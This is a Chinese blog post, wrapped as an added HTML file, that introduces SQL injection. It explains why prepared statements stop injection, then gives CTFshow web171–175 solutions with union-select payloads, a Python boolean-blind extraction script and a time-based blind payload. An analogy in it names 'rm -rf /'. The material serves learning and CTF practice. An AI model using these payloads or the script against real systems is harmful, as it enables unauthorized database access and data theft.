@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>浅谈 SQL 注入 | weyung's Blog</title>
+    <meta name="date" content="2025-03-29">
+    <link rel="canonical" href="https://weyung.cc/posts/1b0be0cc/">
+    <meta property="og:title" content="浅谈 SQL 注入 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="一边瞎扯一边学习，也是很爽的。">
+    <meta property="og:description" content="一边瞎扯一边学习，也是很爽的。">
+    <meta property="og:url" content="https://weyung.cc/posts/1b0be0cc/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">浅谈 SQL 注入</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>浅谈 SQL 注入</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>前言</h3>
+          <p>我很早就接触过 MySQL，高考完暑假的时候就用 PHP 和 MySQL 搞了个简单的成绩查询系统，当时还不知道有 SQL 注入这个东西，回想起来要是漏给一个会 SQL 注入的人，估计就被打烂了。</p>
+          <p>但是为什么一直没怎么学 SQL 注入呢？—— 因为后来听说参数化查询基本可以完全防住 SQL 注入了，就感觉学这个没什么意义了。</p>
+          <p>现在转念一想，咱又不是搞前沿的，用这个打打老系统绰绰有余（关键是面试官真的会问），那就学一下咯。</p>
+          <p>小 Review: 发现之前写的 BUUOJ 有几题 SQL 注入的题目，挖了坑没补过程，准备学完补上。</p>
+          <h3>参数化查询是如何防御 SQL 注入的</h3>
+          <p>可以看下知乎的<a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener noreferrer">这个回答</a>，大概意思如下：</p>
+          <p>有一个 SQL 语句：</p>
+          <pre><code class="language-sql">select count(1) from students where name='张三'</code></pre>
+          <p>注入语句：</p>
+          <pre><code class="language-sql">select count(1) from students where name='张三' or 1=1</code></pre>
+          <p>那么 <code class="language-text">name</code> 参数的值 <code class="language-text">张三' or 1=1</code> 就会被当成 SQL 语句的一部分，整个一块编译，导致 SQL 注入。</p>
+          <p>这时候预编译来了，以下是一个 Java 的实现：</p>
+          <pre><code class="language-java">import java.sql.PreparedStatement;
+
+String sql = "select * from user where username=? and passwd=?";
+ps = conn.PreparedStatement(sql);
+ps.setString(1, "admin");
+ps.setString(2, "123456");
+resultSet = ps.executeQuery();</code></pre>
+          <p>可以看到，<code class="language-text">conn.PreparedStatement()</code> 函数直接把 SQL 语句编译好了，后面只是传参 + 执行。</p>
+          <p>可能读者咋一眼看上去会觉得没什么区别，我拿大家都熟悉的场景来举个例子：</p>
+          <p>相信大家都是接触过 C 语言的，没有预编译的 SQL 就相当于你可以操作 <code class="language-text">\*.c</code> 文件给编译器编译并执行，可以把 <code class="language-text">int a=?;</code> 填成 <code class="language-text">int a=1; system("rm -rf /");</code>，而预编译的 SQL 就相当于编译了一段 <code class="language-text">int a=0;scanf("%d", &amp;a);</code>，现在程序只负责接收参数并执行，根本无法编译恶意代码。</p>
+          <h3>CTFshow 刷题记录</h3>
+          <h4>web171 - web175</h4>
+          <p>给 Xenny 充点钱，在 <a href="https://www.nssctf.cn/problem/sheet/10708" target="_blank" rel="noopener noreferrer">NSS</a> 上吸收了一下知识，读者如果像我一样也是个小白也可以去支持一下，十来块钱不算贵。</p>
+          <p>以 CTFshow 的 web171 为例，查询语句题目直接给出（不会有人不知道 PHP 能用 <code class="language-text">.</code> 拼接字符串吧）</p>
+          <pre><code class="language-php">$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></pre>
+          <p>那我们直接 <code class="language-text">'--+</code> 闭合即可。（<code class="language-text">--</code> 是注释符号，<code class="language-text">+</code> 是干嘛的我也不清楚，加就是了，<code class="language-text">#</code> 也是注释符号，可以根据情况来），引号闭合的意义就是补全前面代码，使得前面部分加上这个引号是一个正常的语句，注释的意义是无视后面的代码，那么这时中间就可以写我们的 SQL 语句了。</p>
+          <pre><code class="language-sql">' order by 3--+</code></pre>
+          <p>换成 4 就报错，说明列数为 3</p>
+          <p>那么采用联注，语句如下：</p>
+          <pre><code class="language-sql">' union select database(),version(),user()--+</code></pre>
+          <p>结果分别为 <code class="language-text">ctfshow_web</code>, <code class="language-text">10.3.18-MariaDB</code>, <code class="language-text">root\@localhost</code></p>
+          <p>查表：</p>
+          <pre><code class="language-sql">' union select 1,2,table_name from information_schema.tables where table_schema='ctfshow_web'--+</code></pre>
+          <p>结果为 <code class="language-text">ctfshow_user</code></p>
+          <p>再查列：</p>
+          <pre><code class="language-sql">' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user'--+</code></pre>
+          <p>结果为分别为 <code class="language-text">id</code>, <code class="language-text">username</code>, <code class="language-text">password</code></p>
+          <p>最后直接套出整个表，当然根据题意加个 <code class="language-text">where username = 'flag'</code> 也行：</p>
+          <pre><code class="language-sql">' union select id,username,password from ctfshow_user--+</code></pre>
+          <p>web172 也是类似，虽然加了个如下拦截，但是我们不出现 <code class="language-text">username</code> 字段即可</p>
+          <pre><code class="language-php">//检查结果是否有flag
+    if($row->username!=='flag'){
+      $ret['msg']='查询成功';
+    }</code></pre>
+          <p>还是仿照上面一套打下来，最终 payload 如下：</p>
+          <pre><code class="language-sql">' union select id,password from ctfshow_user2 where username='flag'--+</code></pre>
+          <p>web173 的拦截比较有意思，直接正则匹配结果了，考虑能不能用 <code class="language-text">substr()</code> 之类的函数截取字符串</p>
+          <pre><code class="language-php">//检查结果是否有flag
+    if(!preg_match('/flag/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }</code></pre>
+          <p>发现他的 flag 头是 <code class="language-text">ctfshow{</code>，根本不用管，绷，payload 如下：</p>
+          <pre><code class="language-sql">' union select id,1,password from ctfshow_user3--+</code></pre>
+          <p>web174 有点刁难了，把数字也拦截了</p>
+          <pre><code class="language-php">//检查结果是否有flag
+    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }</code></pre>
+          <p>考虑布尔盲注，payload 如下：</p>
+          <pre><code class="language-sql">1' and 1=1--+</code></pre>
+          <p>发现此时有返回结果而改为 <code class="language-text">1=0</code> 时返回的结果为空，说明布尔盲注可行，脚本如下：</p>
+          <pre><code class="language-python">import requests as r
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+value = ''
+i = 1
+
+while True:
+    low, high = 0, 127
+    char_ascii = 0
+    
+    while low &lt;= high:
+        mid = (low + high) // 2
+        # payload = f"1' and 1=if(ascii(substr((database()), {i}, 1)) > {mid}, 1, 0)--+"
+        payload = f"1' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4 where username='flag'), {i}, 1)) > {mid}, 1, 0)--+"
+        payload = payload.replace(' ', '%20')
+        payload = payload.replace("'", "%27")
+        # print(payload)
+        result = r.get(f'https://777fe6df-5d10-4f76-81f6-91f860d5de1e.challenge.ctf.show/api/v4.php?id={payload}&amp;Page=1&amp;limit=10', verify=False)
+
+        oracle = len(result.json()['data']) > 0
+        
+        if oracle:  # 条件成立，ASCII值大于mid
+            low = mid + 1
+        else:
+            high = mid - 1
+    
+    if high &lt; 0:  # 字符位置不存在时退出
+        break
+    
+    char_ascii = high + 1
+    if char_ascii == 0:
+        break
+    
+    value += chr(char_ascii)
+    print(f"Current: {value}")
+    i += 1
+
+print(f"Final value: {value}")</code></pre>
+          <p>注意到 python 用 https 时需要加上 <code class="language-text">verify=False</code>，否则会报错，还要加上 <code class="language-text">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</code> 来禁止警告。</p>
+          <p>Python 的 <code class="language-text">requests</code> 还有个坑就是会把 params 猛猛地 urlencode 一遍，导致最终的 url 面目全非，从而导致 payload 不生效。</p>
+          <p>web175 拦截更离谱了，直接啥都拦了</p>
+          <pre><code class="language-php">//检查结果是否有flag
+    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }</code></pre>
+          <p>我倒是想知道生产环境会不会有这么拦的</p>
+          <p>那从解题的角度来说那只能时间盲注了，payload 如下：</p>
+          <pre><code class="language-sql">1' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user5 where username='flag'), {i}, 1)) > {mid}, sleep(1), 0)--+</code></pre>
+          <p>oracle 改为 <code class="language-text">result.elapsed.total_seconds() > 1</code> 即可。</p>
+          <h3>参考</h3>
+          <p><a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener noreferrer">https://www.zhihu.com/question/52869762</a> <a href="https://www.freebuf.com/articles/web/339118.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/339118.html</a></p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/ctf/" style="--tag-background:var(--tag-background-green);--tag-color:var(--tag-color-green);--tag-background-hover:var(--tag-hover-green);--tag-border:var(--tag-border-green);--tag-border-hover:var(--tag-border-green);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-flag.svg&quot;);"></span><span class="tag-content"><span>CTF</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/渗透/" style="--tag-background:var(--tag-background-teal);--tag-color:var(--tag-color-teal);--tag-background-hover:var(--tag-hover-teal);--tag-border:var(--tag-border-teal);--tag-border-hover:var(--tag-border-teal);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-sword.svg&quot;);"></span><span class="tag-content"><span>渗透</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2025 年 3 月 29 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/web/">Web</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/1b0be0cc/">https://weyung.cc/posts/1b0be0cc/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/535b1aa9/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">2025 红明谷杯 - Crypto</p></a><a class="post-neighbor" href="/posts/f4bdfdb8/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">多线程：Python VS Golang</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
